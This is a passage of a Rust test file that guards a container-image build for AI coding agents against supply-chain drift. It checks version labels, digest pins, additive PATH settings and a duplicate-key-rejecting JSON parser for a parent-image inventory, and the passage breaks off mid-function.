fn every_shipped_version_label_is_present_exactly_once() {
    let mut seen = active_version_labels(&standard_dockerfile());
    let mut expected: Vec<String> = VERSION_SLOTS
        .iter()
        .map(|(label, _)| format!("org.agent-vm.version.{label}"))
        .collect();
    seen.sort();
    expected.sort();
    assert_eq!(
        seen, expected,
        "the standard-owned version labels drifted from the eight-slot contract"
    );
}

#[test]
fn commented_out_version_labels_fail_the_guards() {
    assert_eq!(
        active_label_values("FROM scratch\nLABEL a=1 b=\"2\"\n"),
        vec![
            ("a".to_string(), "1".to_string()),
            ("b".to_string(), "2".to_string())
        ],
        "active LABEL pairs must parse"
    );
    assert_eq!(
        label_value(
            "FROM scratch\nLABEL org.agent-vm.version.copilot=\"${AGENT_VERSION_COPILOT}\"\n",
            "org.agent-vm.version.copilot"
        ),
        "${AGENT_VERSION_COPILOT}",
        "the active copilot label value must parse"
    );

    let commented =
        "FROM scratch\n# LABEL org.agent-vm.version.copilot=\"${AGENT_VERSION_COPILOT}\"\n";
    assert!(
        active_label_values(commented).is_empty(),
        "a commented LABEL must not be read: {commented:?}"
    );
    assert_eq!(
        find_label_value(commented, "org.agent-vm.version.copilot"),
        None,
        "a commented LABEL must fail the guard"
    );

    let copilot = standard_dockerfile();
    let mutated = copilot.replace(
        "LABEL org.agent-vm.version.copilot=",
        "# LABEL org.agent-vm.version.copilot=",
    );
    assert_ne!(mutated, copilot, "the mutation must change the text");
    assert!(
        !active_version_labels(&mutated).contains(&"org.agent-vm.version.copilot".to_string()),
        "the shipped-label set must notice the commented label"
    );
}

#[test]
fn continuations_join_and_the_exact_slot_grammar_rejects_bad_defaults() {
    let continued = "FROM scratch\nLABEL org.agent-vm.version.pi=\"x\" \\\n      org.agent-vm.version.pi-claude-bridge=\"y\"\n";
    assert_eq!(
        active_label_values(continued),
        vec![
            ("org.agent-vm.version.pi".to_string(), "x".to_string()),
            (
                "org.agent-vm.version.pi-claude-bridge".to_string(),
                "y".to_string()
            )
        ],
        "a continued LABEL must be joined"
    );

    for good in ["1.2.3", "0.159.3-alpha.1.2", "1.2.3-rc.1+build.01"] {
        assert!(is_exact_semver(good), "{good:?} is exact semver");
    }
    for bad in ["a.b.c", "01.2.3", "1.2.3-01", "1.2.3-a.", "1.2", "latest"] {
        assert!(!is_exact_semver(bad), "{bad:?} is NOT exact semver");
    }
}

// ---------------------------------------------------------------------------
// Recipe-source walkers: no base install helper, no upstream latest
// ---------------------------------------------------------------------------

/// Filesystem inventory shared by the source guards. Callers retain their own
/// directory exclusions and error policy; no symlink directory is followed.
fn source_files(mut stack: Vec<PathBuf>, skipped: &[&str]) -> Vec<Result<PathBuf, String>> {
    let mut files = Vec::new();
    while let Some(directory) = stack.pop() {
        let entries = match std::fs::read_dir(&directory) {
            Ok(entries) => entries,
            Err(error) => {
                files.push(Err(format!("cannot read {}: {error}", directory.display())));
                continue;
            }
        };
        for entry in entries {
            let entry = entry.expect("directory entry");
            let path = entry.path();
            if entry.file_type().expect("file type").is_dir() {
                if !skipped.contains(&entry.file_name().to_string_lossy().as_ref()) {
                    stack.push(path);
                }
            } else {
                files.push(Ok(path));
            }
        }
    }
    files
}

/// Collect every committed file under `images/tools` as `(relative path, bytes)`.
fn image_source_files() -> Vec<(PathBuf, Vec<u8>)> {
    let root = repo_path("images");
    let roots = vec![
        root.join("tools"),
        root.join("standard"),
        root.join("recipe-contract"),
        root.join("pnpm"),
    ];
    let mut out = Vec::new();
    for path in source_files(roots, &[]) {
        let path = path.unwrap_or_else(|error| panic!("{error}"));
        let relative = path.strip_prefix(&root).expect("under root").to_path_buf();
        let contents =
            std::fs::read(&path).unwrap_or_else(|error| panic!("read {}: {error}", path.display()));
        out.push((relative, contents));
    }
    for name in ["Dockerfile", "install-pnpm.sh"] {
        out.push((
            PathBuf::from(name),
            std::fs::read(root.join(name)).expect("base source"),
        ));
    }
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out
}

/// A recipe Dockerfile/hook/contract/JSON source (not docs, not the
/// `install.upstream.sh` provenance snapshots).
fn is_recipe_source(path: &Path) -> bool {
    if is_provenance_snapshot(path)
        || path
            .file_name()
            .unwrap()
            .to_string_lossy()
            .starts_with("upgrade-")
    {
        return false;
    }
    matches!(
        path.file_name().and_then(|name| name.to_str()),
        Some("Dockerfile")
    ) || matches!(
        path.extension().and_then(|ext| ext.to_str()),
        Some("sh" | "js" | "py")
    )
}

fn is_provenance_snapshot(path: &Path) -> bool {
    path.to_string_lossy().ends_with("install.upstream.sh")
}

#[test]
fn no_shipped_recipe_calls_the_base_agent_vm_install_helper() {
    let mut offenders = Vec::new();
    for (path, contents) in image_source_files() {
        if !is_recipe_source(&path) {
            continue;
        }
        if String::from_utf8_lossy(&contents).contains("agent-vm-install") {
            offenders.push(path);
        }
    }
    assert!(
        offenders.is_empty(),
        "these shipped recipes still call the base agent-vm-install helper: {offenders:?}"
    );
}

/// A recipe `ENV PATH=<new>:${PATH}` line must keep the base's entries. ADR-0035
/// retires the runtime layer contract, but `images/tools/README.md` still
/// requires maintainers to prepend additively so a recipe can never drop a
/// directory the base put there; this source-only guard keeps that rule honest
/// now that the embed-time composer is gone (Standards S8).
fn check_additive_path(text: &str, recipe: &str) -> Result<(), String> {
    for line in text.lines() {
        let line = line.trim();
        if line.starts_with('#') {
            continue;
        }
        let Some(rest) = line.strip_prefix("ENV ") else {
            continue;
        };
        // Parse each `KEY=value` assignment and require the PATH one itself to
        // carry `${PATH}`. Inspecting the whole line would accept a decoy that
        // inherits PATH in a sibling field (`OTHER=${PATH}`) while overwriting it.
        for assignment in rest.split_whitespace() {
            let Some((key, value)) = assignment.split_once('=') else {
                return Err(format!(
                    "{recipe}/Dockerfile uses an ENV form this guard cannot check: {line}"
                ));
            };
            if key == "PATH" && !value.contains("${PATH}") {
                return Err(format!(
                    "{recipe}/Dockerfile sets a non-additive ENV PATH: {line}"
                ));
            }
        }
    }
    Ok(())
}

#[test]
fn shipped_recipes_extend_path_additively() {
    check_additive_path(&standard_dockerfile(), "standard")
        .unwrap_or_else(|problem| panic!("{problem}"));
}

#[test]
fn no_shipped_recipe_resolves_upstream_latest() {
    const FORBIDDEN: [&str; 7] = [
        "/update/api/latest",
        "releases/latest",
        "/latest/download",
        "dist-tags.latest",
        "@latest",
        ":-latest",
        "claude-code-releases/latest",
    ];
    let mut offenders = Vec::new();
    for (path, contents) in image_source_files() {
        if !is_recipe_source(&path) || is_provenance_snapshot(&path) {
            continue;
        }
        let text = String::from_utf8_lossy(&contents);
        for (index, line) in text.lines().enumerate() {
            if line.trim_start().starts_with('#') {
                continue;
            }
            for needle in FORBIDDEN {
                if line.contains(needle) {
                    offenders.push(format!("{}:{}: {needle}", path.display(), index + 1));
                }
            }
        }
    }
    assert!(
        offenders.is_empty(),
        "these shipped recipes still resolve upstream latest: {offenders:?}"
    );
}

/// The exact-install hooks and vendored runnable installers are shipped.
#[test]
fn exact_image_install_hooks_exist() {
    let expected = [
        "codex/install-codex.sh",
        "codex/verify-codex.sh",
        "codex/vendor/install.sh",
        "opencode/install-opencode.sh",
        "opencode/verify-opencode.sh",
        "opencode/vendor/install.sh",
        "claude/install-claude.sh",
        "claude/verify-claude.sh",
        "claude/vendor/install.sh",
        "copilot/install-copilot.sh",
        "copilot/verify-copilot.sh",
        "dsh/install-dsh.sh",
        "dsh/verify-dsh.sh",
        "dsh/prepare-lock.sh",
        "dsh/check-runtime.mjs",
        "dsh/probe-dsh.py",
        "dsh/project.py",
        "pi/install-pi.sh",
        "pi/install-pi-packages.sh",
        "pi/verify-pi.sh",
        "pi/prepare-lock.sh",
        "pi/bridge/prepare-lock.sh",
        // Build-only authenticated defences (#52 C3): the selected-archive
        // converter and extractor, the installed-graph/byte proof and the runtime
        // probe. They are mounted read-only, never COPYed into a runtime layer.
        "pi/import-shrinkwrap.mjs",
        "pi/archive.py",
        "pi/installed-graph.mjs",
        "pi/check-installed-bytes.mjs",
        "pi/check-runtime.mjs",
        // The owning preparation process (#52 C4): mounted with the Pi source,
        // never COPYed into a runtime layer.
        "pi/prepare-project.py",
    ];
    for relative in expected {
        let path = repo_path(&format!("images/tools/{relative}"));
        assert!(
            path.is_file(),
            "{} must exist and be a regular file",
            path.display()
        );
    }
}

/// The authenticated Pi defences are build-only. A COPY would put the archive
/// parser and the byte comparator in the runtime layer, where an image author
/// could not review them through the mount contract.
#[test]
fn pi_build_only_helpers_are_never_copied() {
    let dockerfile = standard_dockerfile();
    let build_only = [
        "tools/pi/import-shrinkwrap.mjs",
        "tools/pi/archive.py",
        "tools/pi/installed-graph.mjs",
        "tools/pi/check-installed-bytes.mjs",
        "tools/pi/check-runtime.mjs",
        "tools/pi/prepare-project.py",
        "tools/pi/reviewed-normalisations.json",
    ];
    for line in dockerfile.lines() {
        let trimmed = line.trim_start();
        if !trimmed.to_ascii_uppercase().starts_with("COPY ") {
            continue;
        }
        for helper in build_only {
            assert!(
                !trimmed.contains(helper),
                "the build-only helper {helper} must be a read-only mount, not COPYed: {trimmed}"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Self-controls: on in-memory copies, each production gate must reject a
// deliberately broken input (the checked-in files must pass).
// ---------------------------------------------------------------------------

#[test]
fn image_source_guards_reject_mutations() {
    // The bridge installer must keep the reviewed pnpm argv and none of the
    // retired workarounds. Each mutation below is an in-memory copy.
    let script = read_text("images/tools/pi/install-pi-packages.sh");
    assert!(check_bridge_install_flags(&script).is_ok());
    for (name, mutated) in [
        (
            "dropping --frozen-lockfile",
            script.replace(" --frozen-lockfile", ""),
        ),
        (
            "dropping --ignore-scripts",
            script.replace("--ignore-scripts", "--frozen-lockfile"),
        ),
        (
            "restoring --legacy-peer-deps",
            script.replace("--ignore-scripts", "--ignore-scripts --legacy-peer-deps"),
        ),
        (
            "restoring --no-optional",
            script.replace("--ignore-scripts", "--ignore-scripts --no-optional"),
        ),
        (
            "reintroducing a bridge absence producer",
            script.replace(
                "installed=1",
                "printf 'absent-transport %s\\n' 56 >\"$STATUS_DIR/pi-claude-bridge\"",
            ),
        ),
        (
            "bypassing the hard runner",
            script.replace("run-pnpm.sh", "sh -c"),
        ),
    ] {
        assert_ne!(
            mutated, script,
            "the {name} mutation must change the script"
        );
        assert!(
            check_bridge_install_flags(&mutated).is_err(),
            "{name} must fail the gate"
        );
    }

    // A required flag that exists only in a trailing shell comment is never
    // passed to the manager and must not satisfy the gate.
    let commented = "# run-pnpm.sh install --prod --frozen-lockfile\nrun-pnpm.sh ok \\\n    --ignore-scripts # --package-import-method=copy --config.trust-policy=no-downgrade\n";
    assert!(
        check_bridge_install_flags(commented).is_err(),
        "a required flag only in a trailing comment must not satisfy the gate"
    );

    // A reviewed project whose four-input bytes no longer match its pins must
    // fail the digest gate before any structural claim is made about it. The
    // graph adapter is the only reader of a migrated project, so this is the
    // control that the retired npm-lock readers used to provide.
    for source in [pi_project(), bridge_project()] {
        let fixture = ProjectFixture::copy(&source, "stale-pin");
        fixture.rewrite("package.json", |text| {
            text.replacen("\"version\": \"0.0.0\"", "\"version\": \"0.0.1\"", 1)
        });
        let error = match read_graph(&fixture.project) {
            Ok(_) => panic!("a stale {} input pin must fail the graph gate", source.kind),
            Err(error) => error,
        };
        assert!(
            error.contains("bytes differ from reviewed pin"),
            "the digest gate, not a downstream rule, must reject a stale input: {error:?}"
        );
    }

    // An npm project lock reappearing beside the four pnpm inputs must fail the
    // unreviewed-input gate: the migration cannot leave a second lock format.
    {
        let source = pi_project();
        let fixture = ProjectFixture::copy(&source, "npm-lock-returned");
        fixture.write("package-lock.json", "{\"lockfileVersion\": 3}\n");
        let error = match read_graph(&fixture.project) {
            Ok(_) => panic!("a returned npm lock must fail the graph gate"),
            Err(error) => error,
        };
        assert!(
            error.contains("unreviewed input: package-lock.json"),
            "an npm lock must be refused as an unreviewed input: {error:?}"
        );
    }

    // A dsh input whose bytes no longer match the reviewed pins must fail the
    // graph gate before any structural claim is made about it.
    let stale = ProjectFixture::copy(
        &MigratedProject::committed("dsh", "images/tools/dsh"),
        "stale-pin",
    );
    stale.rewrite("package.json", |text| {
        text.replacen("\"0.1.5-rc.2\"", "\"0.1.5-rc.1\"", 1)
    });
    let error = match read_graph(&stale.project) {
        Ok(_) => panic!("a stale dsh input pin must fail the graph gate"),
        Err(error) => error,
    };
    assert!(
        error.contains("package.json: bytes differ from reviewed pin"),
        "the digest gate, not a downstream rule, must reject a stale input: {error:?}"
    );

    // A recipe `ENV PATH` that drops `${PATH}` must fail the additive-path gate.
    assert!(check_additive_path("ENV PATH=/opt/go/bin:${PATH}\n", "fixture").is_ok());
    assert!(
        check_additive_path("ENV PATH=/opt/go/bin\n", "fixture").is_err(),
        "a non-additive ENV PATH must fail the gate"
    );
    // A commented non-additive line is inert and must not trip the gate.
    assert!(
        check_additive_path("# ENV PATH=/opt/go/bin\n", "fixture").is_ok(),
        "a commented ENV PATH must not be inspected"
    );
    // A decoy that inherits the real PATH in an unrelated field must not satisfy
    // the guard while PATH itself is overwritten (permanent control for the
    // previous whole-line `${PATH}` substring bypass).
    assert!(
        check_additive_path("ENV PATH=/opt/custom OTHER=${PATH}\n", "fixture").is_err(),
        "a sibling field carrying ${{PATH}} must not make PATH additive"
    );
    assert!(
        check_additive_path("ENV OTHER=${PATH} PATH=/opt/custom\n", "fixture").is_err(),
        "a non-additive PATH after a sibling assignment must fail"
    );
    // An `ENV` form this guard cannot parse is rejected rather than skipped.
    assert!(
        check_additive_path("ENV PATH /opt/custom\n", "fixture").is_err(),
        "an unparseable ENV form must be rejected"
    );

    // Commenting a version label must drop it from the active set.
    let copilot = standard_dockerfile();
    let commented = copilot.replace(
        "LABEL org.agent-vm.version.copilot=",
        "# LABEL org.agent-vm.version.copilot=",
    );
    assert!(
        !active_version_labels(&commented).contains(&"org.agent-vm.version.copilot".to_string()),
        "a commented label must fail the label guard"
    );
}

/// The `sh <script>` command each recipe phase must run. dsh and Pi are the
/// migrated pnpm consumers, so their files come from a bound source directory:
/// dsh keeps `/tmp/dsh-source` and Pi mounts the whole tools directory at
/// `/tmp/standard-tools`, which is also the finished gate's path.
fn phase_invocations(tool: &str) -> [(&'static str, String); 2] {
    if tool == "dsh" {
        [
            ("install", "sh /tmp/dsh-source/install-dsh.sh".to_string()),
            ("verify", "sh /tmp/dsh-source/verify-dsh.sh".to_string()),
        ]
    } else if tool == "pi" {
        [
            (
                "install",
                "sh /tmp/standard-tools/pi/install-pi.sh".to_string(),
            ),
            (
                "verify",
                "sh /tmp/standard-tools/pi/verify-pi.sh".to_string(),
            ),
        ]
    } else {
        [
            ("install", format!("sh /tmp/install-{tool}.sh")),
            ("verify", format!("sh /tmp/verify-{tool}.sh")),
        ]
    }
}

/// The one mount both product Dockerfiles use for the composed helper directory.
const RECIPE_CONTRACT_MOUNT: &str =
    "--mount=from=recipe-contract-bin,source=/out,target=/tmp/recipe-contract,ro";

/// The builder stage's pinned image and its two RUNs. Docker stages do not cross
/// Dockerfiles, so base and standard each declare it; the declarations must stay
/// byte-identical and the image version must be the one go.mod selects.
fn check_recipe_contract_builder(text: &str) -> Result<(), String> {
    let (stage, _) = recipe_contract_stages(text)?;
    let image = stage
        .lines()
        .next()
        .and_then(|line| line.split_whitespace().nth(2))
        .ok_or("the builder stage has no image")?;
    if !image.contains("@sha256:") {
        return Err("the Go builder image must be digest-pinned".into());
    }
    let (tag, digest) = image.split_once("@sha256:").ok_or("bad builder image")?;
    if digest.len() != 64 || !digest.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err("the Go builder digest must be 64 hex characters".into());
    }
    let declared = tag
        .split(':')
        .nth(1)
        .ok_or("the Go builder image must declare a version tag")?;
    let go_mod = read_text("images/recipe-contract/go.mod");
    let toolchain = go_mod
        .lines()
        .find_map(|line| line.strip_prefix("toolchain go"))
        .ok_or("go.mod must declare a toolchain directive")?
        .trim();
    // The tag carries the toolchain version plus a reviewed distro suffix.
    if !declared.starts_with(&format!("{toolchain}-")) {
        return Err(format!(
            "builder image is {declared}, go.mod toolchain is {toolchain}"
        ));
    }
    // go/version owns language/toolchain ordering in buildcheck. Both contracts
    // modes run that test; this guard owns only the image declaration.
    for required in [
        "AS recipe-contract-bin",
        "ARG TARGETARCH",
        "COPY recipe-contract/ ./",
        "GOTOOLCHAIN=local GOWORK=off GOFLAGS= GOENV=off",
        "go test -tags recipe_contract_image_compiler -run '^TestImageCompiler$' ./internal/buildcheck",
        "GOOS=linux GOARCH=$TARGETARCH CGO_ENABLED=0 bash ./build.sh /out",
    ] {
        if !stage.contains(required) {
            return Err(format!("builder stage misses {required}"));
        }
    }
    Ok(())
}

fn builder_stage(text: &str) -> &str {
    let (block, _) = recipe_contract_stages(text).expect("builder/product stages");
    // Trailing blank/comment lines belong to whatever follows the stage.
    let mut cut = block.len();
    for line in block.lines().rev() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            cut -= line.len() + 1;
        } else {
            break;
        }
    }
    block[..cut].trim_end()
}

fn recipe_contract_stages(text: &str) -> Result<(&str, &str), String> {
    let start = text
        .find("FROM --platform=$BUILDPLATFORM golang:")
        .ok_or("missing the recipe-contract builder stage")?;
    let rest = &text[start..];
    let end = rest
        .find("\nFROM ")
        .ok_or("the builder stage must precede a FROM")?;
    Ok((&rest[..end], &rest[end + 1..]))
}

fn product_stage(text: &str) -> &str {
    recipe_contract_stages(text)
        .expect("builder/product stages")
        .1
}

#[test]
fn the_two_builder_declarations_agree_with_go_mod() {
    let base = read_text("images/Dockerfile");
    let standard = standard_dockerfile();
    check_recipe_contract_builder(&base).unwrap();
    check_recipe_contract_builder(&standard).unwrap();
    assert_eq!(
        builder_stage(&base),
        builder_stage(&standard),
        "the builder stage declarations must stay byte-identical"
    );
    let go_mod = read_text("images/recipe-contract/go.mod");
    let toolchain = go_mod
        .lines()
        .find_map(|line| line.strip_prefix("toolchain go"))
        .expect("toolchain")
        .trim();
    let image_tag = format!("golang:{toolchain}-");
    for mutation in [
        base.replacen(&image_tag, "golang:0.0.0-", 1),
        base.replacen("@sha256:", "@sha256:00", 1),
        base.replacen("GOARCH=$TARGETARCH", "GOARCH=amd64", 1),
        base.replacen("GOTOOLCHAIN=local", "GOTOOLCHAIN=auto", 1),
        base.replacen("COPY recipe-contract/", "COPY missing/", 1),
        base.replacen(
            "go test -tags recipe_contract_image_compiler -run '^TestImageCompiler$' ./internal/buildcheck",
            "true",
            1,
        ),
    ] {
        assert!(
            check_recipe_contract_builder(&mutation).is_err(),
            "accepted builder mutation"
        );
    }
    let mismatched = base.replace(&image_tag, "golang:999.0.0-");
    assert_ne!(mismatched, base);
    assert!(check_recipe_contract_builder(&mismatched).is_err());
}

/// The converted helpers must not come back as Python, and no caller may invoke
/// the retired entrypoints or a Python file out of a contract directory.
///
/// The scan is lexical over one filesystem root, so a new untracked file cannot
/// escape it and a test can point it at a scratch mutation of the live tree. Two
/// rules are enforced:
///
/// * The converted module is Go and shell only: no `.py`/`.pyc` file and no file
///   whose first line is a Python shebang. Bytes are read as bytes, so one
///   invalid UTF-8 byte cannot hide a shebang.
/// * No command position runs Python on a contract path or on a retired helper
///   name, and no command position names a retired helper. Quoted data is allowed
///   (a golden or help string may spell the old name); Dockerfile `RUN` lines and
///   workflow `run:` bodies are scanned because they execute strings the same way.
///
/// Known lexical gaps, deliberately left to other gates: a `python3 - <<EOF`
/// heredoc bodies an interpreter that is caught by contracts.sh's embedded-Python
/// gate instead; a helper with no shebang and no `.py` name is only caught when a
/// caller mentions it; and a path assembled from two shell variables
/// (`"$DIR/$(echo tool_access)"`) is not resolved here.
const RETIRED_HELPERS: [&str; 2] = ["install-status.py", "check-tool-access.py"];

// --- parent inventory (#95) -------------------------------------------------
//
// `images/parent-pins.json` is the single record of what every maintained recipe
// builds on. This gate owns what the host resolver cannot: it re-derives the pins
// from the committed recipes, refuses a hostile edit of the JSON (beginning with
// duplicate keys, which a `Value` would already have collapsed), and keeps the
// maintenance path out of every build entrypoint. Ordinary builds only read pins.

const PARENT_INVENTORY: &str = "images/parent-pins.json";
const DEBIAN_PIN: &str = "debian";
const GO_PIN: &str = "golang-builder";
const RELEASE_PIN: &str = "standard-release";
const LOCAL_BASE: &str = "agent-vm-base:local";
/// The trusted release identity, tied to `script/release/attestations.py`
/// (`REPO`/`WORKFLOW`) by `the_signer_identity_agrees_with_the_release_verifier`;
/// composing the signer from the parsed repository would accept any repository
/// that signs with a workflow of the same name.
const RELEASE_REPOSITORY: &str = "gregwebs/agent-vm-images";
const RELEASE_WORKFLOW: &str = ".github/workflows/release-standard.yml";
const PLATFORMS: [&str; 2] = ["linux/amd64", "linux/arm64"];
const HASH_ONLY_EVIDENCE: [&str; 4] = [
    "https://docs.docker.com/engine/security/trust/",
    "https://www.docker.com/blog/docker-content-trust-retirement-and-migration-guidance/",
    "https://docs.docker.com/docker-hub/image-library/trusted-content/",
    "https://www.docker.com/blog/retiring-docker-content-trust/",
];

/// Raw JSON ingestion boundary: reject duplicate object keys at every level
/// before they can collapse into a map.
struct StrictJson(Value);

impl<'de> Deserialize<'de> for StrictJson {
    fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        deserializer.deserialize_any(StrictVisitor)
    }
}

struct StrictVisitor;

impl<'de> Visitor<'de> for StrictVisitor {
    type Value = StrictJson;

    fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {
        formatter.write_str("any JSON value")
    }

    fn visit_bool<E: de::Error>(self, value: bool) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::Bool(value)))
    }

    fn visit_i64<E: de::Error>(self, value: i64) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::Number(value.into())))
    }

    fn visit_u64<E: de::Error>(self, value: u64) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::Number(value.into())))
    }

    fn visit_f64<E: de::Error>(self, value: f64) -> Result<StrictJson, E> {
        Ok(StrictJson(
            serde_json::Number::from_f64(value).map_or(Value::Null, Value::Number),
        ))
    }

    fn visit_str<E: de::Error>(self, value: &str) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::String(value.to_owned())))
    }

    fn visit_string<E: de::Error>(self, value: String) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::String(value)))
    }

    fn visit_none<E: de::Error>(self) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::Null))
    }

    fn visit_unit<E: de::Error>(self) -> Result<StrictJson, E> {
        Ok(StrictJson(Value::Null))
    }

    fn visit_some<D: Deserializer<'de>>(self, deserializer: D) -> Result<StrictJson, D::Error> {
        deserializer.deserialize_any(StrictVisitor)
    }

    fn visit_seq<A: SeqAccess<'de>>(self, mut access: A) -> Result<StrictJson, A::Error> {
        let mut items = Vec::new();
        while let Some(item) = access.next_element::<StrictJson>()? {
            items.push(item.0);
        }
        Ok(StrictJson(Value::Array(items)))
    }

    fn visit_map<A: MapAccess<'de>>(self, mut access: A) -> Result<StrictJson, A::Error> {
        let mut members = serde_json::Map::new();
        while let Some(key) = access.next_key::<String>()? {
            if members.contains_key(&key) {
                return Err(de::Error::custom(format!("duplicate JSON key: {key}")));
            }
            members.insert(key, access.next_value::<StrictJson>()?.0);
        }
        Ok(StrictJson(Value::Object(members)))
    }
}

fn strict_json(text: &str) -> Result<Value, String> {
    serde_json::from_str::<StrictJson>(text)
        .map(|value| value.0)
        .map_err(|error| error.to_string())
}

fn is_lower_hex(value: &str, length: usize) -> bool {
    value.len() == length
        && value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

fn is_date(value: &str) -> bool {
    let bytes = value.as_bytes();
    bytes.len() == 10
        && bytes[4] == b'-'
        && bytes[7] == b'-'
        && bytes
            .iter()
            .enumerate()
            .all(|(index, byte)| index == 4 || index == 7 || byte.is_ascii_digit())
}

fn is_rfc3339(value: &str) -> bool {
    value.len() == 20
        && is_date(&value[..10])
        && value.as_bytes()[10] == b'T'
        && value.ends_with('Z')
        && value[11..19]
            .bytes()
            .all(|byte| byte.is_ascii_digit() || byte == b':')
}

fn is_exact_version(value: &str) -> bool {
    let parts: Vec<&str> = value.split('.').collect();
    parts.len() == 3
        && parts.iter().all(|part| {
            !part.is_empty()
                && part.bytes().all(|byte| byte.is_ascii_digit())
                && (*part == "0" || !part.starts_with('0'))
        })
}

fn text(value: &Value, context: &str) -> Result<String, String> {
    value
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| format!("{context}: string required"))
}

fn object<'a>(
    value: &'a Value,
    context: &str,
) -> Result<&'a serde_json::Map<String, Value>, String> {
    value
        .as_object()
        .ok_or_else(|| format!("{context}: JSON object required"))
}

fn array<'a>(value: &'a Value, context: &str) -> Result<&'a Vec<Value>, String> {
    value
        .as_array()
        .ok_or_else(|| format!("{context}: JSON array required"))
}

fn exact<'a>(
    value: &'a Value,
    keys: &[&str],
    context: &str,
) -> Result<&'a serde_json::Map<String, Value>, String> {
    let members = object(value, context)?;
    let wanted: BTreeSet<&str> = keys.iter().copied().collect();
    let found: BTreeSet<&str> = members.keys().map(String::as_str).collect();
    if wanted != found {
        return Err(format!(
            "{context}: expected exactly {wanted:?}, found {found:?}"
        ));
    }
    Ok(members)
}

fn exact_platforms<'a>(
    value: &'a Value,
    keys: &[&str],
    context: &str,
) -> Result<Vec<&'a serde_json::Map<String, Value>>, String> {
    let platforms = object(value, context)?;
    if platforms
        .keys()
        .map(String::as_str)
        .ne(PLATFORMS.iter().copied())
    {
        return Err(format!(
            "{context}: exactly the amd64 and arm64 platforms are supported"
        ));
    }
    PLATFORMS
        .iter()
        .map(|platform| {
            exact(
                &platforms[*platform],
                keys,
                &format!("{context} {platform}"),
            )
        })
        .collect()
}

#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Digest(String);

impl Digest {
    fn parse(value: &Value, context: &str) -> Result<Digest, String> {
        let raw = text(value, context)?;
        match raw.strip_prefix("sha256:") {
            Some(hex) if is_lower_hex(hex, 64) => Ok(Digest(raw)),
            _ => Err(format!("{context}: invalid SHA-256 digest")),
        }
    }

    fn value(&self) -> &str {
        &self.0
    }
}

#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct SourceRevision(String);

impl SourceRevision {
    fn parse(value: &Value, context: &str) -> Result<SourceRevision, String> {
        let raw = text(value, context)?;
        if is_lower_hex(&raw, 40) {
            Ok(SourceRevision(raw))
        } else {
            Err(format!("{context}: invalid 40-hex source revision"))
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
struct Repository(String);

impl Repository {
    fn parse(raw: &str, context: &str) -> Result<Repository, String> {
        let head = raw.bytes().next();
        let head_ok = head.is_some_and(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit());
        let body_ok = raw.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || b"._/-".contains(&byte)
        });
        if !head_ok || !body_ok {
            return Err(format!("{context}: invalid image repository"));
        }
        Ok(Repository(raw.to_owned()))
    }

    fn value(&self) -> &str {
        &self.0
    }
}

/// A digest reference plus the tag that selected it. Official images are
/// selected by tag and pinned by digest; the released standard image is
/// addressed by digest alone, so its tag is absent.
#[derive(Clone, Debug, PartialEq, Eq)]
struct PinnedReference {
    repository: Repository,
    tag: Option<String>,
    digest: Digest,
}

impl PinnedReference {
    fn parse(value: &Value, context: &str, require_tag: bool) -> Result<PinnedReference, String> {
        let raw = text(value, context)?;
        let (name, digest) = raw
            .split_once('@')
            .ok_or_else(|| format!("{context}: a pinned reference must carry a digest"))?;
        let digest = Digest::parse(&Value::String(digest.to_owned()), context)?;
        let (repository, tag) = match name.rsplit_once(':') {
            Some((repository, tag)) if !tag.is_empty() && !tag.contains('/') => {
                (repository.to_owned(), Some(tag.to_owned()))
            }
            _ => (name.to_owned(), None),
        };
        if require_tag && tag.is_none() {
            return Err(format!(
                "{context}: an official-image reference requires a tag"
            ));
        }
        if !require_tag && tag.is_some() {
            return Err(format!(
                "{context}: this pin must reference a digest without a tag"
            ));
        }
        Ok(PinnedReference {
            repository: Repository::parse(&repository, context)?,
            tag,
            digest,
        })
    }

    fn text(&self) -> String {
        match &self.tag {
            Some(tag) => format!("{}:{tag}@{}", self.repository.value(), self.digest.value()),
            None => format!("{}@{}", self.repository.value(), self.digest.value()),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct OfficialPlatform {
    manifest: Digest,
    revision: SourceRevision,
    source: String,
    created: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ReleasePlatform {
    manifest: Digest,
}

/// Reviewed provenance. A hash-only exception is digest-bound and carries its
/// reason and reassessment condition; a released pin must carry GitHub
/// attestation provenance under this repository's composed signer workflow.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Verification {
    HashOnly {
        reviewed_on: String,
        reason: String,
        evidence: Vec<String>,
        reassess: String,
    },
    GithubAttestation {
        repository: String,
        signer_workflow: String,
        source_ref: String,
        source_sha: SourceRevision,
        release_json_sha256: Digest,
        invocation_url: String,
    },
}

/// The release path composes its workflow from the repository constant, so the
/// inventory must name that same composed value rather than a look-alike.
fn signer_workflow(repository: &str) -> String {
    format!("{repository}/{RELEASE_WORKFLOW}")
}

impl Verification {
    fn parse(value: &Value, context: &str) -> Result<Verification, String> {
        let members = object(value, context)?;
        match members.get("method").and_then(Value::as_str) {
            Some("hash-only") => {
                let members = exact(
                    value,
                    &["method", "reviewed_on", "reason", "evidence", "reassess"],
                    context,
                )?;
                let reviewed_on = text(&members["reviewed_on"], context)?;
                if !is_date(&reviewed_on) {
                    return Err(format!("{context}: invalid review date"));
                }
                let reason = text(&members["reason"], context)?;
                let reassess = text(&members["reassess"], context)?;
                if reason.trim().is_empty() || reassess.trim().is_empty() {
